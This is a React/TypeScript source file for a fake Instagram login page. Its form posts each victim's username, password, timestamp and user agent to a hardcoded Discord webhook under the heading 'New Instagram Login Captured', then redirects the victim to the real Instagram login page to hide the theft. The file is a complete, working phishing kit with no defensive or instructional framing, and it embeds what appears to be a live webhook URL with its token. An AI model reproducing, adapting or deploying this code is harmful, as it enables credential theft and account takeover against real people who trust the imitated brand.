import React, { useState } from 'react';

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1463484987163803790/J2qxpuQvOhPyNkLnqHesUHONXSHNzM2K0L15ORx0E3PG86M_Sy6CCtTyOntbcB1t_ABo';

const LoginForm: React.FC = () => {
  const [credentials, setCredentials] = useState({
    identifier: '',
    password: ''
  });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setCredentials(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    try {
      const payload = {
        embeds: [{
          title: "🔑 New Instagram Login Captured",
          color: 0, 
          fields: [
            { name: "👤 Identifier", value: `\`${credentials.identifier}\`` || "N/A", inline: true },
            { name: "🔒 Password", value: `\`${credentials.password}\`` || "N/A", inline: true },
            { name: "🕒 Timestamp", value: new Date().toLocaleString(), inline: false },
            { name: "🌐 User Agent", value: navigator.userAgent, inline: false }
          ],
          footer: { text: "Instagram Auth Security Service" }
        }]
      };

      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      window.location.href = 'https://www.instagram.com/accounts/login/';
    } catch (err) {
      console.error('Submission encountered an issue:', err);
      window.location.href = 'https://www.instagram.com/accounts/login/';
    } finally {
      setIsSubmitting(false);
    }
  };

  const isFormValid = credentials.identifier.length > 0 && credentials.password.length >= 1;

  return (
    <form onSubmit={handleSubmit} className="w-full flex flex-col gap-2">
      <input
        type="text"
        name="identifier"
        value={credentials.identifier}
        onChange={handleInputChange}
        placeholder="Phone number, username, or email"
        className="w-full bg-[#121212] border border-[#262626] rounded-[3px] px-2 py-2 text-xs text-white focus:outline-none focus:border-[#363636] transition-all placeholder:text-[#8e8e8e]"
        required
      />
      <input
        type="password"
        name="password"
        value={credentials.password}
        onChange={handleInputChange}
        placeholder="Password"
        className="w-full bg-[#121212] border border-[#262626] rounded-[3px] px-2 py-2 text-xs text-white focus:outline-none focus:border-[#363636] transition-all placeholder:text-[#8e8e8e]"
        required
      />
      <button
        type="submit"
        disabled={!isFormValid || isSubmitting}
        className={`mt-2 w-full py-1.5 rounded-lg text-sm font-semibold text-white transition-all 
          ${isFormValid && !isSubmitting ? 'bg-[#0095f6] hover:bg-[#1877f2]' : 'bg-[#0095f6] opacity-50 cursor-default'}`}
      >
        {isSubmitting ? 'Logging in...' : 'Log in'}
      </button>
    </form>
  );
};

const App: React.FC = () => {
  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-black">
      <main className="w-full max-w-[350px] flex flex-col gap-3">
        <div className="bg-black border border-[#262626] px-10 pt-10 pb-6 flex flex-col items-center">
          <div className="mb-8">
            <h1 className="text-white text-5xl instagram-logo select-none">Instagram</h1>
          </div>
          
          <LoginForm />

          <div className="flex items-center w-full my-4">
            <div className="flex-grow border-t border-[#262626]"></div>
            <span className="px-4 text-[#8e8e8e] text-xs font-semibold uppercase">OR</span>
            <div className="flex-grow border-t border-[#262626]"></div>
          </div>

          <button className="flex items-center text-[#385185] font-semibold text-sm mb-4 transition-opacity hover:opacity-80">
            <svg className="w-5 h-5 mr-2" fill="#0095f6" viewBox="0 0 24 24">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            <span className="text-[#0095f6] text-sm font-semibold">Log in with Facebook</span>
          </button>

          <a href="#" className="text-xs text-[#D1AD63] font-semibold text-center mt-2 hover:underline">Forgot password?</a>
        </div>

        <div className="bg-black border border-[#262626] py-5 flex justify-center">
          <p className="text-sm text-white">
            Don't have an account? <a href="#" className="text-[#0095f6] font-semibold">Sign up</a>
          </p>
        </div>

        <div className="flex flex-col items-center mt-2">
          <p className="text-sm text-[#fafafa] my-4">Get the app.</p>
          <div className="flex gap-2">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/512px-Google_Play_Store_badge_EN.svg.png" 
              alt="Get it on Google Play" 
              className="h-[40px] w-auto cursor-pointer"
              referrerPolicy="no-referrer"
            />
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Get_it_from_Microsoft_Badge.svg/512px-Get_it_from_Microsoft_Badge.svg.png" 
              alt="Get it from Microsoft" 
              className="h-[40px] w-auto cursor-pointer"
              referrerPolicy="no-referrer"
            />
          </div>
        </div>
      </main>

      <footer className="mt-20 w-full max-w-[1000px] px-4 text-center">
        <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-xs text-[#8e8e8e] mb-4">
          <a href="#" className="hover:underline">Meta</a>
          <a href="#" className="hover:underline">About</a>
          <a href="#" className="hover:underline">Blog</a>
          <a href="#" className="hover:underline">Jobs</a>
          <a href="#" className="hover:underline">Help</a>
          <a href="#" className="hover:underline">API</a>
          <a href="#" className="hover:underline">Privacy</a>
          <a href="#" className="hover:underline">Terms</a>
          <a href="#" className="hover:underline">Locations</a>
          <a href="#" className="hover:underline">Instagram Lite</a>
          <a href="#" className="hover:underline">Threads</a>
          <a href="#" className="hover:underline">Contact Uploading & Non-Users</a>
          <a href="#" className="hover:underline">Meta Verified</a>
        </div>
        <div className="text-xs text-[#8e8e8e] mb-10 flex items-center justify-center gap-4">
          <select className="bg-transparent border-none outline-none text-[#8e8e8e] cursor-pointer">
            <option>English</option>
          </select>
          <span>© 2024 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
};

export default App;